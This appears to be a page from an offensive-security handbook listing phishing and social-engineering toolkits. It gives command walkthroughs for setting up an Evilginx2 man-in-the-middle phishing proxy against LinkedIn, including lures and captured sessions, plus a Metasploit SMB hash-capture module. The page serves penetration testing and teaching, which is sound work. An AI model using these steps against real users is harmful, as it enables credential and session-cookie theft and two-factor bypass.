# Social Engineering Tools

- [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/13_social_engineering_tools.md#Resources)

## Table of Contents

- [Evilginx2](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/13_social_engineering_tools.md#Evilginx2)
- [Gophish](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/13_social_engineering_tools.md#Gophish)
- [Metasploit](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/13_social_engineering_tools.md#Metasploit)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| BlackPhish | Super lightweight with many features and blazing fast speeds. | https://github.com/iinc0gnit0/BlackPhish |
| Evilginx2 Phishlets | Evilginx2 Phishlets version (0.2.3) Only For Testing/Learning Purposes | https://github.com/An0nUD4Y/Evilginx2-Phishlets |
| evilginx2 | Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication | https://github.com/kgretzky/evilginx2 |
| evilgophish | evilginx2 + gophish | https://github.com/fin3ss3g0d/evilgophish |
| EvilnoVNC | Ready to go Phishing Platform | https://github.com/JoelGMSec/EvilnoVNC |
| Gophish | Open-Source Phishing Toolkit | https://github.com/gophish/gophish |
| Nexphisher | Advanced Phishing tool for Linux & Termux | https://github.com/htr-tech/nexphisher |
| SocialFish | Phishing Tool & Information Collector  | https://github.com/UndeadSec/SocialFish |
| SniperPhish | SniperPhish - The Web-Email Spear Phishing Toolkit | https://github.com/GemGeorge/SniperPhish |
| The Social-Engineer Toolkit (SET) | The Social-Engineer Toolkit is an open-source penetration testing framework designed for social engineering. | https://github.com/trustedsec/social-engineer-toolkit |

## Evilginx2

> https://help.evilginx.com/docs/getting-started/building

> https://help.evilginx.com/docs/getting-started/quick-start

> https://help.evilginx.com/docs/guides/phishlets

### Installation

```c
$ sudo apt-get install golang
$ git clone https://github.com/kgretzky/evilginx2.git
$ cd evilginx2
$ make
$ sudo ./build/evilginx -p ./phishlets -t ./redirectors -developer
```

### Prepare Certificates

```c
$ sudo cp /root/.evilginx/crt/ca.crt /usr/local/share/ca-certificates/evilginx.crt
$ sudo update-ca-certificates
```

### Setup Phishing Domain

```c
: config domain <DOMAIN>
: config ipv4 127.0.0.1
```

### Phishlets

> https://help.evilginx.com/docs/guides/phishlets

> https://github.com/An0nUD4Y/Evilginx2-Phishlets

```c
: phishlets hostname linkedin linkedin.<DOMAIN>
: phishlets enable linkedin
: phishlets unauth_url linkedin https://<DOMAIN>
: phishlets get-hosts linkedin
: phishlets linkedin
```

### Lures

> https://help.evilginx.com/docs/guides/lures

```c
: lures create linkedin
: lures
: lures get-url 0
```

### Sessions

```c
: sessions
: sessions 0
```

## Gophish

> https://github.com/sdcampbell/Internal-Pentest-Playbook

> https://www.ired.team/offensive-security/initial-access/phishing-with-gophish-and-digitalocean

### Port Forwarding

```c
$ ssh -i ~/.ssh/<SSH_KEY> root@<RHOST> -p <RPORT> -L3333:localhost:3333 -N -f
```

## Metasploit

### NTLMv1 Hashes

```c
msf6 > use auxiliary/server/capture/smb
msf6 auxiliary(server/capture/smb) > run
```
